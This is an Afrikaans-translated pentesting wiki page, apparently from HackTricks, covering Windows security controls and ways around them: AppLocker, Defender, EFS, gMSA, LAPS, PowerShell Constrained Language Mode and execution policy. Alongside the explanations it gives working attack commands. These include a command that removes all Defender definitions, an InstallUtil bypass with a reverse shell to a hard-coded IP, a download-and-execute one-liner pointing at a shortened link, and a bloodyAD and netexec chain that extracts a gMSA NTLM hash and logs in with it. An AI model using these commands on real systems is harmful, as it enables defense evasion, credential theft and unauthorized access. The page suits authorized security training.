# Windows-sekuriteitskontroles

{{#include ../../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Application whitelist is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat toegelaat word om op 'n stelsel teenwoordig te wees en uitgevoer te word. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie by die spesifieke besigheidsbehoeftes van 'n organisasie pas nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **application whitelisting solution** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **granulêre beheer** oor uitvoerbare lêers, scripts, Windows-installeerderlêers, DLLs, verpakte toepassings en verpakte toepassingsinstalleerders.\
Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe blokkeer** en skryftoegang tot sekere gidse beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied ’n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **Writable folders** om AppLocker Policy te omseil: As AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **writable folders** wat jy kan gebruik om dit te **bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swakgeskrewe reëls kan ook omseil word**
- Byvoorbeeld, met **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** kan jy ’n **lêergids genaamd `allowed`** enige plek skep, en dit sal toegelaat word.
- Organisasies fokus ook dikwels daarop om die **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** te **blokkeer**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement** word baie selde geaktiveer weens die bykomende las wat dit op ’n stelsel kan plaas, asook die hoeveelheid toetsing wat nodig is om te verseker dat niks sal breek nie. Die gebruik van **DLL's as backdoors sal dus help om AppLocker te omseil**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Geloofsbriefberging

### Security Accounts Manager (SAM)

Plaaslike geloofsbriewe is in hierdie lêer teenwoordig; die wagwoorde is gehash.

### Local Security Authority (LSA) - LSASS

Die **geloofsbriewe** (gehash) word in die **geheue** van hierdie substelsel **gestoor** vir Single Sign-On-doeleindes.\
**LSA** administreer die plaaslike **sekuriteitsbeleid** (wagwoordbeleid, gebruikerstoestemmings...), **authentication**, **access tokens**...\
LSA is die een wat die **verskafte geloofsbriewe** binne die **SAM**-lêer sal **kontroleer** (vir ’n plaaslike aanmelding) en met die **domain controller** sal **kommunikeer** om ’n domeingebruiker te authenticate.

Die **geloofsbriewe** word binne die **LSASS-proses** **gestoor**: Kerberos-tickets, NT- en LM-hashes, maklik gedekripteerde wagwoorde.

### LSA secrets

LSA kan sommige geloofsbriewe op skyf stoor:

- Wagwoord van die rekenaarrekening van die Active Directory (onbereikbare domain controller).
- Wagwoorde van die rekeninge van Windows-dienste
- Wagwoorde vir geskeduleerde take
- Meer (wagwoord van IIS-toepassings...)

### NTDS.dit

Dit is die databasis van die Active Directory. Dit is slegs teenwoordig op Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n Antivirus wat in Windows 10 en Windows 11, asook in weergawes van Windows Server, beskikbaar is. Dit **blokkeer** algemene pentesting-tools soos **`WinPEAS`**. Daar is egter maniere om hierdie **beskermings te omseil**.

### Check

Om die **status** van **Defender** te kontroleer, kan jy die PS-cmdlet **`Get-MpComputerStatus`** uitvoer (kontroleer die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate, kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Geënkripteerde lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie te gebruik, met ’n **simmetriese sleutel** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **publieke sleutel** geënkripteer en binne die geënkripteerde lêer se $EFS **alternatiewe datastroom** gestoor. Wanneer dekripsie nodig is, word die ooreenstemmende **private sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK vanuit die $EFS-stroom te dekripteer. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.

**Dekripsiescenario's sonder gebruikersinisiëring** sluit die volgende in:

- Wanneer lêers of vouers na ’n nie-EFS-lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), geskuif word, word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor oordrag gedekripteer.

Hierdie enkripsiemetode bied die eienaar **deursigtige toegang** tot geënkripteerde lêers. Om bloot die eienaar se wagwoord te verander en aan te meld, sal egter nie dekripsie moontlik maak nie.

**Belangrikste punte**:

- EFS gebruik ’n simmetriese FEK wat met die gebruiker se publieke sleutel geënkripteer is.
- Dekripsie gebruik die gebruiker se private sleutel om toegang tot die FEK te verkry.
- Outomatiese dekripsie vind onder spesifieke toestande plaas, soos wanneer na FAT32 gekopieer word of tydens netwerktransmissie.
- Geënkripteerde lêers is vir die eienaar toeganklik sonder bykomende stappe.

### Kontroleer EFS-inligting

Kontroleer of ’n **gebruiker** hierdie **diens** **gebruik** het deur te kontroleer of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** toegang tot die lêer het met cipher /c \<file>\
Jy kan ook `cipher /e` en `cipher /d` binne ’n vouer gebruik om al die lêers te **enkripteer** en te **dekripteer**

### Dekripteer EFS-lêers

#### Om Authority System te wees

Hierdie metode vereis dat die **slagoffergebruiker** ’n **proses** binne die gasheer **laat loop**. Indien dit die geval is, kan jy met ’n `meterpreter`-sessie die gebruiker se prosestoken naboots (`impersonate_token` from `incognito`). Alternatiewelik kan jy eenvoudig na die gebruiker se proses `migrate`.

#### Om die gebruiker se wagwoord te ken

Mimikatz dokumenteer hoe om die gebruiker se sertifikaat/private sleutel-materiaal in te voer en EFS-beskermde lêers te dekripteer wanneer die wagwoord bekend is.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Password never expire**"-instelling geaktiveer het, bied gMSA’s ’n veiliger en makliker bestuurbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSA’s gebruik ’n komplekse wagwoord van 240 karakters wat outomaties volgens domein- of rekenaarbeleid verander. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde sekuriteit**: Hierdie rekeninge is immuun teen lockouts en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
- **Ondersteuning vir veelvuldige gashere**: gMSA’s kan oor verskeie gashere gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
- **Ondersteuning vir geskeduleerde take**: Anders as managed service accounts, ondersteun gMSA’s die uitvoer van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel dateer die Service Principal Name (SPN) outomaties op wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA’s word in die LDAP-eienskap _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) teruggestel. Hierdie wagwoord, ’n geënkripteerde datablob bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA’s geïnstalleer is, verkry word, wat ’n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, word ’n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geverifieer wees.

![Relaying NTLM authentication to retrieve a gMSA password](../../images/asd1.png)<sup>[[1]](#references)</sup>

Jy kan hierdie wagwoord met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** lees<sup>[[2]](#references)</sup>.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in die geargiveerde oorspronklike navorsing**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Dieselfde navorsing verduidelik hoe ’n **NTLM relay attack** ’n **gMSA password** kan bekom wanneer die gerelayeerde principal gemagtig is om `msDS-ManagedPassword` te lees.<sup>[[1]](#references)</sup>

### Misbruik van ACL chaining om gMSA managed password te lees (GenericAll -> ReadGMSAPassword)

In baie omgewings kan gebruikers met lae voorregte na gMSA-secrets pivot sonder ’n DC compromise deur verkeerd gekonfigureerde object ACLs te misbruik:<sup>[[3]](#references)</sup>

- ’n Groep wat jy kan beheer (byvoorbeeld via GenericAll/GenericWrite), kry `ReadGMSAPassword` oor ’n gMSA.
- Deur jouself by daardie groep te voeg, erf jy die reg om die gMSA se `msDS-ManagedPassword` blob oor LDAP te lees en bruikbare NTLM credentials af te lei.

Tipiese workflow:

1) Ontdek die pad met BloodHound en merk jou foothold principals as Owned. Soek edges soos:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Voeg jouself by die intermediêre groep wat jy beheer (voorbeeld met bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Lees die gMSA-bestuurde wagwoord via LDAP en lei die NTLM-hash af. NetExec outomatiseer die onttrekking van `msDS-ManagedPassword` en die omskakeling na NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Staaf as die gMSA met die NTLM-hash (geen plaintext nodig nie). As die rekening in Remote Management Users is, sal WinRM direk werk:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notas:
- LDAP-leesbewerkings van `msDS-ManagedPassword` vereis sealing (byvoorbeeld LDAPS/sign+seal). Tools hanteer dit outomaties.
- gMSAs kry dikwels plaaslike regte soos WinRM; valideer groep-lidmaatskap (byvoorbeeld Remote Management Users) om laterale beweging te beplan.
- As jy slegs die blob nodig het om die NTLM self te bereken, sien die MSDS-MANAGEDPASSWORD_BLOB-struktuur.



## LAPS

Die **Local Administrator Password Solution (LAPS)**, wat by [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) afgelaai kan word, maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **gerandomiseer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs tot gemagtigde gebruikers beperk. Met voldoende toegekende toestemmings word die vermoë om plaaslike admin-wagwoorde te lees, verskaf.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies af** wat nodig is om PowerShell effektief te gebruik, soos die blokkering van COM-objekte, die beperking tot slegs goedgekeurde .NET-tipes, XAML-gebaseerde workflows, PowerShell-klasse, en meer.

### **Check**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Op huidige Windows-weergawes werk daardie bypass nie meer nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compileer, moet jy dalk** **’n** _**verwysing byvoeg**_ -> _Blaai_ ->_Blaai_ -> voeg `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` by en **verander die projek na .Net4.5**.

#### Direkte bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die constrained mode te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS-uitvoeringsbeleid

Dit is by verstek op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> gevind word

## Security Support Provider Interface (SSPI)

Is die API wat gebruik kan word om gebruikers te authenticateer.

SSPI kies ’n toepaslike authentication protocol vir twee kommunikerende masjiene, met voorkeur aan Kerberos wanneer dit beskikbaar is. Hierdie protocols word geïmplementeer deur Security Support Providers (SSPs), wat as DLLs op Windows geïnstalleer word; beide peers moet die negotiated provider ondersteun.

### Main SSPs

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Vir compatibility reasons
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Webbedieners en LDAP, wagwoord in die vorm van ’n MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om die protocol te onderhandel wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek een)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een bied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n feature wat ’n **consent prompt vir elevated activities** moontlik maak.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
{{#include ../../banners/hacktricks-training.md}}
